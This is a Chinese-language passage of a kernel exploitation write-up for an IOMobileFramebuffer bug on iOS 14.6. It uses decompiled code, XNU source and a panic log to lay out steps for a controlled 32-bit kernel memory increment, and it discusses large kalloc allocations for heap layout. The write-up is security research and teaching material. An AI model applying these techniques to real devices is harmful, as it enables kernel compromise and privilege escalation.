<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (*(found_swap + <span class="number">868</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> &amp;&amp; *(input_swap + <span class="number">56</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  *(found_swap + <span class="number">869</span>) = <span class="number">1</span>;</span><br><span class="line">  v55 = <span class="number">0LL</span>;</span><br><span class="line">  address = *(input_swap + <span class="number">56</span>);</span><br><span class="line">  task = <span class="built_in">current_task</span>();</span><br><span class="line">  v55 = IOMemoryDescriptor::<span class="built_in">withAddressRange</span>(address, <span class="number">0x20CuLL</span>, <span class="number">3u</span>, task);</span><br><span class="line">  <span class="keyword">if</span> ( v55 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (v55-&gt;prepare)(v55, <span class="number">0LL</span>) )</span><br><span class="line">      <span class="built_in">panic</span>(<span class="string">&quot;\&quot;%s System error: Failure to prepare memory descriptor\\n\&quot;&quot;</span>, <span class="string">&quot;swap_submit&quot;</span>);</span><br><span class="line">    v54 = <span class="number">-1431655766</span>;</span><br><span class="line">    v54 = (v55-&gt;readBytes)(v55, <span class="number">0LL</span>, found_swap + <span class="number">0x366</span>, <span class="number">0x20CLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v54 != <span class="number">0x20CLL</span> )</span><br><span class="line">      <span class="built_in">panic</span>(<span class="string">&quot;\&quot;%s System error: Mismatched data size\\n\&quot;&quot;</span>, <span class="string">&quot;swap_submit&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    (v55-&gt;complete)(v55, <span class="number">0LL</span>);</span><br><span class="line">    (v55-&gt;release_0)(v55);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以控制偏移量为0xc0和0x3f0的指针。如果我们用这个对象输入混淆，那么我们就可以在内核内存的任何地方做32位增量。唯一要弄清楚的是，我们是否能得到一个指向我们提交给UnifiedPipeline对象的IOMFBSwapIORequest对象的指针。这个问题的答案就在UnifiedPipeline::swap_submit的底部。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v63 = IOMobileFramebufferLegacy::<span class="built_in">swap_queue</span>(UnifiedPipeline, found_swap);</span><br></pre></td></tr></table></figure>

<p>经过对该函数的逆向分析，发现在UnifiedPipeline对象中，有一个IOMFBSwapIORequest对象的尾队列，从偏移量0xb18开始。最终，IOMobileFramebufferLegacy::queue_move_entry_gated被调用。在它的中间附近，有一个明显的<a target="_blank" rel="noopener" href="https://linux.die.net/man/3/queue">TAILQ_INSERT_TAIL</a>。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*(found_swap + <span class="number">0x630</span>) = <span class="number">0LL</span>;</span><br><span class="line">*(found_swap + <span class="number">0x638</span>) = UnifiedPipeline_swap_tailq_B18-&gt;tqe_last;</span><br><span class="line">*UnifiedPipeline_swap_tailq_B18-&gt;tqe_last = found_swap;</span><br><span class="line">UnifiedPipeline_swap_tailq_B18-&gt;tqe_last = (found_swap + <span class="number">0x630</span>);</span><br></pre></td></tr></table></figure>

<p>由于<a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/bsd/sys/queue.h#L600">TAILQ_HEAD</a>宏将tqe_last初始化为指向tqe_first的地址，第三行将found_swap写到UnifiedPipeline对象的偏移量0xb18。因此，每次我们成功调用IOMobileFramebufferUserClient::s_swap_submit时，我们可以指望一个指向结构输入中指定的交换的指针出现在UnifiedPipeline对象的偏移量0xb18处。</p>
<p>有了到目前为止我们所知道的一切，我们应该能够通过以下步骤来增加32位的内核内存:</p>
<ol>
<li>用IOMobileFramebufferUserClient::s_swap_start创建一个新的IOMFBSwapIORequest。</li>
<li>使用IOMobileFramebufferUserClient::s_swap_submit来获取在步骤1中创建的IOMFBSwapIORequest对象的偏移量0xc0和0x3f0的受控字节。0xc0将是我们提供的内核指针，0x3f0将是NULL。该交换对象的指针将被写入UnifiedPipeline对象的偏移量0xb18。</li>
<li>调用 IOMobileFramebufferUserClient::s_displayed_fb_surface 的越界下标16，因为0xb18 - 0xa98是0x80，而 0x80&#x2F;sizeof(IOMFBSwapIORequest *) 是16。我们将进入IOSurfaceSendRight::init，oob_surface指向IOMFBSwapIORequest对象，IOSurface::increment_use_count将愉快地增加该交换的八个受控字节在偏移量0xc0所指向的32位。<ol>
<li>0xa98是IOSurface数组的偏移量，我们可以从它那里越界读。</li>
</ol>
</li>
</ol>
<p>通过在swap的偏移量0xc0处放置一个类似0x41414142424的指针来测试这个方法。如果内核在OSIncrementAtomic中解除对它的引用，那么我们就成功了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;bug_type&quot;</span>:<span class="string">&quot;210&quot;</span>,<span class="string">&quot;timestamp&quot;</span>:<span class="string">&quot;2021-11-03 13:06:45.00 -0400&quot;</span>,<span class="string">&quot;os_version&quot;</span>:<span class="string">&quot;iPhone OS 14.6 (18F72)&quot;</span>,<span class="string">&quot;incident_id&quot;</span>:<span class="string">&quot;D6CE2A99-9C2A-49E4-8150-D648AC1F3BE6&quot;</span>&#125;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;build&quot;</span> : <span class="string">&quot;iPhone OS 14.6 (18F72)&quot;</span>,</span><br><span class="line">  <span class="string">&quot;product&quot;</span> : <span class="string">&quot;iPhone10,4&quot;</span>,</span><br><span class="line">  <span class="string">&quot;kernel&quot;</span> : <span class="string">&quot;Darwin Kernel Version 20.5.0: Sat May  8 02:21:43 PDT 2021; root:xnu-7195.122.1~4\/RELEASE_ARM64_T8015&quot;</span>,</span><br><span class="line">  <span class="string">&quot;incident&quot;</span> : <span class="string">&quot;D6CE2A99-9C2A-49E4-8150-D648AC1F3BE6&quot;</span>,</span><br><span class="line">  <span class="string">&quot;crashReporterKey&quot;</span> : <span class="string">&quot;1db1b5662483938458430f8a3af5439dc5f1064d&quot;</span>,</span><br><span class="line">  <span class="string">&quot;date&quot;</span> : <span class="string">&quot;2021-11-03 13:06:45.03 -0400&quot;</span>,</span><br><span class="line">  <span class="string">&quot;panicString&quot;</span> : <span class="string">&quot;panic(cpu 2 caller 0xfffffff028aff2d4): Unaligned kernel data abort. at pc 0xfffffff0289b230c, lr 0xfffffff028e5409c (saved state: 0xffffffe8045eb380)</span></span><br><span class="line"><span class="string">    x0: 0x4141414142424256  x1:  0x0000000000000000  x2:  0xfffffff0289b4fac  x3:  0x0000000000000000</span></span><br><span class="line"><span class="string">    x4: 0x0000000000000000  x5:  0x0000000000000000  x6:  0x0000000000000000  x7:  0x0000000000000330</span></span><br><span class="line"><span class="string">    x8: 0x0000000000000001  x9:  0x0000000000000001  x10: 0x0000000000000002  x11: 0xffffffe4cc2ca458</span></span><br><span class="line"><span class="string">    x12: 0x0000000000000001 x13: 0x0000000000000002  x14: 0xffffffe19cc1a920  x15: 0x0000000000000003</span></span><br><span class="line"><span class="string">    x16: 0x0000000000000000 x17: 0x000000000000000f  x18: 0xfffffff028aed000  x19: 0xffffffe4cc2ca450</span></span><br><span class="line"><span class="string">    x20: 0x0000000000000001 x21: 0x0000000000000000  x22: 0xffffffe4cc1a0860  x23: 0x00000000e00002c2</span></span><br><span class="line"><span class="string">    x24: 0x0000000000000000 x25: 0xffffffe8045ebaec  x26: 0xffffffe4cd7601f0  x27: 0xffffffe4cd80ebf4</span></span><br><span class="line"><span class="string">    x28: 0x0000000000000000 fp:  0xffffffe8045eb6e0  lr:  0xfffffff028e5409c  sp:  0xffffffe8045eb6d0</span></span><br><span class="line"><span class="string">    pc:  0xfffffff0289b230c cpsr: 0x60400204         esr: 0x96000021          far: 0x4141414142424256</span></span><br></pre></td></tr></table></figure>

<p>为什么x0不是0x41414142424242，是因为IOSurface::increment_use_count在它传递给OSIncrementAtomic的指针上增加了0x14。</p>
<h2 id="oob-surface-surface-id存在的问题"><a href="#oob-surface-surface-id存在的问题" class="headerlink" title="oob_surface-&gt;surface_id存在的问题"></a>oob_surface-&gt;surface_id存在的问题</h2><p>每次用IOMobileFramebufferUserClient::s_displayed_fb_surface做增量时，都会通过其标量输出返回一个Mach端口名称。在内核中，这个端口是由一个IOSurfaceSendRight对象支持的。IOSurfaceSendRight是一个小对象，通常携带一个指向IOSurface的指针。但对我们来说，这将是一个指向 IOMFBSwapIORequest 对象的指针，为了简单起见，从现在起将这些端口称为 “swap端口”。</p>
<p>当我们在这里处理端口时，99%的IOSurface kext都在处理ID。更大的情形是这样的：每个IOSurfaceRootUserClient客户端都维护它自己的IOSurfaceClient对象数组。IOSurface ID实际上只是该数组的一个索引。如果某个索引的IOSurfaceClient指针是NULL，那么这个索引就被认为是一个自由的IOSurface ID。IOSurfaceClient对象是携带一个指向IOSurface的指针。这可以用一行代码来总结。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IOSurface *surface = IOSurfaceRootUserClient-&gt;surface_client_array[surface_id]-&gt;surface;</span><br></pre></td></tr></table></figure>

<p><img src="https://jsherman212.github.io/assets/popping_ios14_with_iomfb/iosurface_bigger_picture.png"></p>
<p>绿色方框代表结构字段。IOSurfaceRootUserClient的IOSurfaceClient指针数组在偏移量0x118，IOSurfaceClient对象的IOSurface指针在偏移量0x40。</p>
<p>对于这个kext的99%来说，如果某个IOSurface ID没有IOSurfaceClient对象，那么这个ID对应的IOSurface对象就可能不存在。而这正是我们的问题–我们只有一个端口。幸运的是，IOSurfaceRootUserClient的外部方法34，IOSurfaceRootUserClient::s_lookup_surface_from_port，旨在解决这个问题。它接收一个由IOSurfaceSendRight对象支持的Mach端口，并吐出一个IOSurface ID，以及许多其他的字节，我不知道其目的是什么。</p>
<p>我的第一个想法是使用IOSurfaceRootUserClient::s_lookup_surface_from_port来获得一个swap端口的ID。然后我就用这个ID和其他IOSurfaceRootUserClient的外部方法结合起来，尝试泄露IOSurface的指针，这些指针被写到IOMobileFramebufferUserClient::s_swap_submit里面的交换对象。</p>
<p>当调用IOSurfaceRootUserClient::s_lookup_surface_from_port与一个swap端口时，它将意识到没有IOSurfaceClient对象存在，而这个对象是连接到支持的IOSurfaceSendRight对象的IOMFBSwapIORequest。因此，一个新的IOSurfaceClient对象将被分配，IOSurfaceClient::init将被调用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">IOSurfaceClient::init_IOSurfaceRootUserClient___IOSurface___bool</span><span class="params">(</span></span><br><span class="line"><span class="params">        IOSurfaceClient *a1,</span></span><br><span class="line"><span class="params">        IOSurfaceRootUserClient *iosruc,</span></span><br><span class="line"><span class="params">        IOSurface *oob_surface,</span></span><br><span class="line"><span class="params">        <span class="type">char</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">  a1-&gt;m.surface = oob_surface;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">  a1-&gt;m.surface_id = <span class="number">0</span>;</span><br><span class="line">  a1-&gt;m.user_client = iosruc;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !IOSurfaceRootUserClient::set_surface_handle(iosruc, a1, oob_surface-&gt;surface_id) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  a1-&gt;m.surface_id = oob_surface-&gt;surface_id;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* ... */</span>  </span><br><span class="line"></span><br><span class="line">  surface = a1-&gt;m.surface;</span><br><span class="line">  field_B8 = surface-&gt;field_B8;</span><br><span class="line">  v13 = field_B8 | (((*(*surface-&gt;qword38 + <span class="number">0xA8</span>LL))(surface-&gt;qword38) == <span class="number">2</span>) &lt;&lt; <span class="number">12</span>) | <span class="number">0x4000001</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> v16;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>就像IOSurfaceSendRight::init一样，oob_surface指向一个IOMFBSwapIORequest对象。对IOSurfaceRootUserClient::set_surface_handle的调用正是为了使新的IOSurfaceClient对象在IOSurface kext中可见。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">IOSurfaceRootUserClient::set_surface_handle</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        IOSurfaceRootUserClient *iosruc,</span></span></span><br><span class="line"><span class="params"><span class="function">        IOSurfaceClient *iosc,</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 wanted_handle)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( wanted_handle &amp;&amp; iosruc-&gt;m.surface_client_array_capacity &gt; wanted_handle )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">  result = IOSurfaceRootUserClient::<span class="built_in">alloc_handles</span>(iosruc);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_4:</span><br><span class="line">    surface_client_array = iosruc-&gt;m.surface_client_array;</span><br><span class="line">    <span class="keyword">if</span> ( surface_client_array[wanted_handle] )</span><br><span class="line">      <span class="built_in">panic</span>(</span><br><span class="line">        <span class="string">&quot;\&quot;IOSurfaceRootUserClient::set_surface_handle asked to set handle %08x that was not free: %p\&quot;&quot;</span>,</span><br><span class="line">        wanted_handle,</span><br><span class="line">        iosruc-&gt;m.surface_client_array[wanted_handle]);</span><br><span class="line">    surface_client_array[wanted_handle] = iosc;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果这个函数成功，一个带有指向IOMFBSwapIORequest的指针的IOSurfaceClient对象将被注册在IOSurfaceRootUserClient对象的IOSurfaceClient数组内，该对象被用于调用IOSurfaceRootUserClient::s_lookup_surface_from_port。还有最后一个问题：wanted_handle参数的值是什么？因为它来自oob_surface-&gt;surface_id，让我们检查surface_id的偏移量（x20是oob_surface）。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LDR             W2, [X20,#0xC] ; a3</span><br><span class="line">MOV             X0, X21 ; a1</span><br><span class="line">MOV             X1, X19 ; iosruc</span><br><span class="line">BL              IOSurfaceRootUserClient__set_surface_handle</span><br></pre></td></tr></table></figure>

<p>所以IOSurface的surface_id是偏移量为0xc处的32位值。我们能控制IOMFBSwapIORequest对象上偏移量0xc处的32位值吗？不能，因为 IOMFBSwapIORequest::create 会将新的 IOMFBSwapIORequest 对象清零。那么如果它是零呢？这不还是一个有效的ID吗？答案又是否定的，因为IOSurface的ID是从1开始的。零被认为是一个无效的ID。</p>
<p>IOSurfaceClient::init也有一个问题，就是靠近底部的虚函数调用。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a1-&gt;m.surface = oob_surface;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">surface = a1-&gt;m.surface;</span><br><span class="line">field_B8 = surface-&gt;field_B8;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">v13 = field_B8 | (((*(*surface-&gt;qword38 + <span class="number">0xA8LL</span>))(surface-&gt;qword38) == <span class="number">2</span>) &lt;&lt; <span class="number">12</span>) | <span class="number">0x4000001</span>;</span><br></pre></td></tr></table></figure>

<p>如果我们想让IOSurfaceClient::init返回一个成功代码，这个调用是不可避免的。虽然我们确实控制了偏移量0x38的八个字节（这就是qword38所代表的），但我们没有办法伪造vtable指针的PAC。</p>
<p>看起来利用IOSurfaceRootUserClient::s_lookup_surface_from_port来获取一个swap端口的IOSurface ID是不可能的了。</p>
<h2 id="猜测游戏"><a href="#猜测游戏" class="headerlink" title="猜测游戏"></a>猜测游戏</h2><p>zone map并不是唯一可以在内核中进行控制分配的地方。kalloc系列函数有一些非常好的东西：如果分配的大小太大，无法放入任何zone，那么就会从zone map之外返回内存。所有的kalloc变体都会调用<a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/kalloc.c#L875">kalloc_ext</a>，它首先会根据传入的分配大小选择区域。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">kalloc_result</span></span><br><span class="line"><span class="built_in">kalloc_ext</span>(</span><br><span class="line">    <span class="type">kalloc_heap_t</span>         kheap,</span><br><span class="line">    <span class="type">vm_size_t</span>             req_size,</span><br><span class="line">    <span class="type">zalloc_flags_t</span>        flags,</span><br><span class="line">    <span class="type">vm_allocation_site_t</span>  *site)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">vm_size_t</span> size;</span><br><span class="line">    <span class="type">void</span> *addr;</span><br><span class="line">    <span class="type">zone_t</span> z;</span><br><span class="line"></span><br><span class="line">    size = req_size;</span><br><span class="line"></span><br><span class="line">    z = <span class="built_in">kalloc_heap_zone_for_size</span>(kheap, size);</span><br><span class="line">    <span class="keyword">if</span> (__improbable(z == ZONE_NULL)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">kalloc_large</span>(kheap, req_size, size, flags, site);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果传递给它的大小大于kalloc_max_prerounded，kalloc_heap_zone_for_size将返回ZONE_NULL。对于iOS 14.6和iOS 14.7，kalloc_max_prerounded是32769字节，因为任何kheap中最大的区域是用于分配高达32768字节的数据。因此，为了使kalloc_heap_zone_for_size返回ZONE_NULL并进入kalloc_large，我们只需要分配大于32768字节的东西。</p>
<p>下面是<a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/kalloc.c#L744">kalloc_large</a>部分代码:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">__attribute__((noinline))</span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> <span class="title class_">kalloc_result</span></span><br><span class="line"><span class="built_in">kalloc_large</span>(</span><br><span class="line">    <span class="type">kalloc_heap_t</span>         kheap,</span><br><span class="line">    <span class="type">vm_size_t</span>             req_size,</span><br><span class="line">    <span class="type">vm_size_t</span>             size,</span><br><span class="line">    <span class="type">zalloc_flags_t</span>        flags,</span><br><span class="line">    <span class="type">vm_allocation_site_t</span>  *site)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> kma_flags = KMA_ATOMIC;</span><br><span class="line">    <span class="type">vm_tag_t</span> tag;</span><br><span class="line">    <span class="type">vm_map_t</span> alloc_map;</span><br><span class="line">    <span class="type">vm_offset_t</span> addr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">    size = <span class="built_in">round_page</span>(size);</span><br><span class="line"></span><br><span class="line">    alloc_map = <span class="built_in">kalloc_map_for_size</span>(size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ... */</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">kmem_alloc_flags</span>(alloc_map, &amp;addr, size, tag, kma_flags) != KERN_SUCCESS) &#123;</span><br><span class="line">        <span class="keyword">if</span> (alloc_map != kernel_map) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">kmem_alloc_flags</span>(kernel_map, &amp;addr, size, tag, kma_flags) != KERN_SUCCESS) &#123;</span><br><span class="line">                addr = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            addr = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> kalloc_result)&#123; .addr = (<span class="type">void</span> *)addr, .size = req_size &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/kalloc.c#L608">kalloc_map_for_size</a>只是根据大小来选择适当的地图进行分配。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">vm_map_t</span></span></span><br><span class="line"><span class="function"><span class="title">kalloc_map_for_size</span><span class="params">(<span class="type">vm_size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (size &lt; kalloc_kernmap_size) &#123;</span><br><span class="line">        <span class="keyword">return</span> kalloc_map;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> kernel_map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在iPhone 8和iPhone SE上，kalloc_kernmap_size是0x100001字节。因此，通过调用大于32768字节的东西，我们可以忽略Kheap隔离和封存，并从kalloc地图或内核地图中进行分配。真是一种解脱……</p>
<p>kalloc_large调用kmem_alloc_flags，kmem_alloc_flags尾部调用kernel_memory_allocate。 kernel_memory_allocate通过调用vm_map_find_space在传递给它的vm_map中找到空间。真正重要的是<a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/vm/vm_map.c#L1731">vm_map_find_space</a>如何找到空闲内存。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">kern_return_t</span></span></span><br><span class="line"><span class="function"><span class="title">vm_map_find_space</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">vm_map_t</span>                map,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">vm_map_offset_t</span>         *address,       <span class="comment">/* OUT */</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">vm_map_size_t</span>           size,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">vm_map_offset_t</span>         mask,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">int</span>                     flags,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">vm_map_kernel_flags_t</span>   vmk_flags,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">vm_tag_t</span>                tag,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">vm_map_entry_t</span>          *o_entry)</span>       <span class="comment">/* OUT */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">vm_map_entry_t</span>          entry, new_entry, hole_entry;</span><br><span class="line">    <span class="type">vm_map_offset_t</span>         start;</span><br><span class="line">    <span class="type">vm_map_offset_t</span>         end;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">    new_entry = <span class="built_in">vm_map_entry_create</span>(map, FALSE);</span><br><span class="line">    <span class="built_in">vm_map_lock</span>(map);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (flags &amp; VM_MAP_FIND_LAST_FREE) &#123;</span><br><span class="line">        <span class="comment">/* ... */</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (vmk_flags.vmkf_guard_after) &#123;</span><br><span class="line">            <span class="comment">/* account for the back guard page in the size */</span></span><br><span class="line">            size += <span class="built_in">VM_MAP_PAGE_SIZE</span>(map);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *  Look for the first possible address; if there&#x27;s already</span></span><br><span class="line"><span class="comment">         *  something at this address, we have to start after it.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>“寻找第一个可能的地址 “表明，如果我们在zone map之外进行大量分配，它们最终不仅会被连续布置，而且会按照我们分配的顺序布置。对我们来说，VM_MAP_FIND_LAST_FREE不会被设置为标志，因为那是专门为kheap区域分配新的虚拟内存的选项。</p>
